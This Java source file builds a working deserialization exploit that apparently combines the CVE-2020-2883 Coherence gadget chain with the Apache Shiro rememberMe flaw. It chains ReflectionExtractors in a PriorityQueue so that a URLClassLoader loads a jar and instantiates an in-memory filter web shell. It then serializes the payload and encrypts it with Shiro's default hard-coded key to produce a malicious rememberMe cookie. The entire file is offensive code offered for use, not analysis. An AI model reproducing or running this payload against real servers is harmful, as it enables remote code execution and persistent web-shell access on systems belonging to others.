package org.chabug.memshell;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.chabug.util.EncryptUtil;
import org.chabug.util.Serializables;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.PriorityQueue;

public class CVE_2020_2883_URLClassLoader {
    public static void main(String[] args) {
        try {
            ReflectionExtractor extractor1 = new ReflectionExtractor(
                    "getConstructor",
                    new Object[]{new Class[]{URL[].class}}
            );

            ReflectionExtractor extractor2 = new ReflectionExtractor(
                    "newInstance",
                    new Object[]{new Object[]{new URL[]{new URL("file:///C:/Users/Administrator/Desktop/tttt.jar")}}}
            );

            // load filter shell
            ReflectionExtractor extractor3 = new ReflectionExtractor(
                    "loadClass",
                    new Object[]{"org.chabug.memshell.InjectFilterShell"}
            );

            ReflectionExtractor extractor4 = new ReflectionExtractor(
                    "getConstructor",
                    new Object[]{new Class[]{}}
            );

            ReflectionExtractor extractor5 = new ReflectionExtractor(
                    "newInstance",
                    new Object[]{new Object[]{}}
            );


            ValueExtractor[] valueExtractors = new ValueExtractor[]{
                    extractor1,
                    extractor2,
                    extractor3,
                    extractor4,
                    extractor5,
            };
            Class clazz = ChainedExtractor.class.getSuperclass();
            Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
            m_aExtractor.setAccessible(true);

            ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
            ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                    reflectionExtractor
            };

            ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

            PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
            queue.add("1");
            queue.add("1");
            m_aExtractor.set(chainedExtractor1, valueExtractors);

            Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = URLClassLoader.class;
            queueArray[1] = "1";

            byte[] buf = Serializables.serializeToBytes(queue);
            String key = "kPH+bIxk5D2deZiIxcaaaA==";
            String rememberMe = EncryptUtil.shiroEncrypt(key, buf);
            System.out.println(rememberMe);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
